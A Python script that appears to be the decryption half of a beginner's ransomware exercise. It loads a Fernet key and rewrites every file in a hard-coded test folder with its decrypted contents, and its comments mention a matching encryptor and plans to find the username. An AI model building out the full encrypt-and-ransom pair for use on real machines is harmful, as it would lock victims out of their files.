from cryptography.fernet import Fernet
import os

#--------------------------------load key------------------------------
# we'll need the same key so the function to load it is the same
def load_key():
    return open('key.key', 'rb').read()


#--------------------------------decryption------------------------------

def decrypt(items, key):  #(files to decrypt, key)
    f = Fernet(key)  # using fernet method
    for item in items:  # for every item on the directory
        with open(item, 'rb') as file:  # having opened the file in read binary mode,
            encrypted_data = file.read()   # save the data of the file in the variable
        decrypted_data = f.decrypt(encrypted_data)  #decrypt the variable with fernet
        with open(item, 'wb') as file:  # then having the file opened anew in write binary mode,
            file.write(decrypted_data)  # rewrite the decrypted data 
# basically same that before but backwards

if __name__ == '__main__':   # https://www.geeksforgeeks.org/what-does-the-if-__name__-__main__-do/  ; https://stackoverflow.com/questions/419163/what-does-if-name-main-do
    # this is the main program so this condition is true and the code will be executed.

    # still got to discover how to get username xd

    path_to_encrypt = 'C:\\Users\\RitaAlonsoCasablanca\\Desktop\\malware\\ransomware_versions_test\\files'

    items = os.listdir(path_to_encrypt)  #store in the variable items the items that exist in the path, listed by the function listdir 
    full_path = [path_to_encrypt+'\\'+item for item in items]  # this stores the path to every single element of the directory to decrypt ()
    # using list comprehension method, we have the first path, and then a for bucle that adds an element to the list for every item in items (that is, for every file in the directory)

    #call the functions previously created
    key = load_key()
    decrypt(full_path, key)
